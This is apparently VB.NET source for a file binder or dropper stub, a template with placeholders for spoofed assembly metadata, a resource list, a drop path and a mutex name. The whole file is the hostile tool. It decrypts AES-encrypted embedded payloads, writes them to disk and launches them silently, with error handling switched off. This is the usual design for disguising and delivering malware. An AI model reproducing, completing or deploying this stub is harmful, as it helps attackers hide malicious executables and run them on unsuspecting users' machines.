Imports System
Imports System.IO
Imports System.Collections
Imports System.Collections.Generic
Imports System.Threading
Imports System.Diagnostics
Imports System.Runtime.CompilerServices
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports System.Environment
Imports System.Reflection
Imports System.Resources
Imports System.Security.Cryptography
Imports System.Runtime.InteropServices

<Assembly: AssemblyTitle("%Title%")>
<Assembly: AssemblyDescription("%Des%")>
<Assembly: AssemblyCompany("%Company%")>
<Assembly: AssemblyProduct("%Product%")>
<Assembly: AssemblyCopyright("%Copyright%")>
<Assembly: AssemblyTrademark("%Trademark%")>
<Assembly: AssemblyFileVersion("%v1%" + "." + "%v2%" + "." + "%v3%" + "." + "%v4%")>
<Assembly: AssemblyVersion("%v1%" + "." + "%v2%" + "." + "%v3%" + "." + "%v4%")>
<Assembly: Guid("%Guid%")>

Public Class Program

    Public Shared Sub Main()

        If Not CreateMutex() Then Environment.Exit(Environment.ExitCode)

        On Error Resume Next
        Dim file
        For Each file In List
            Dim tempFile As String = GETP(workpath) & "\" & Strings.Split(file, (sp))(0)
            If Strings.Split(file, (sp))(2) = "True" Then
                If Not IO.File.Exists(tempFile) Then
                    IO.File.WriteAllBytes(tempFile, GetTheResource(Strings.Split(file, (sp))(0)))
                    Process.Start(tempFile)
                End If
            Else
                IO.File.WriteAllBytes(tempFile, GetTheResource(Strings.Split(file, (sp))(0)))
                If Strings.Split(file, (sp))(1) = "True" Then
                    Process.Start(tempFile)
                End If
            End If
            GC.Collect()
        Next

    End Sub
    Public Shared Function AES_Decryptor(ByVal input As Byte()) As Byte()
        Dim AES As New RijndaelManaged
        Dim Hash As New MD5CryptoServiceProvider
        Try
            AES.Key = Hash.ComputeHash(System.Text.Encoding.Default.GetBytes(mtx))
            AES.Mode = CipherMode.ECB
            Dim DESDecrypter As ICryptoTransform = AES.CreateDecryptor
            Dim Buffer As Byte() = input
            Return DESDecrypter.TransformFinalBlock(Buffer, 0, Buffer.Length)
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Function
    Public Shared Function GetTheResource(ByVal Get_ As String) As Byte()
        Dim MyAssembly As Assembly = Assembly.GetExecutingAssembly()
        Dim MyResource As New Resources.ResourceManager("#ParentRes", MyAssembly)
        Return AES_Decryptor(MyResource.GetObject(Get_))
    End Function
    Public Shared _appMutex As Mutex
    Public Shared Function CreateMutex() As Boolean
        Dim createdNew As Boolean
        _appMutex = New Mutex(False, mtx, createdNew)
        Return createdNew
    End Function
    Public Shared Function GETP(ByVal StrP As String)
        If (StrP).Contains("%Current%") Then
            Return StrP.Replace("%Current%", AppDomain.CurrentDomain.BaseDirectory)
        Else
            Return System.Environment.ExpandEnvironmentVariables(StrP)
        End If
    End Function
    Public Shared List As List(Of String) = New List(Of String)(New String() {"%list%"})
    Public Shared workpath As String = "%path%"
    Public Shared sp As String = "||'^'||"
    Public Shared mtx As String = "%mut%"
End Class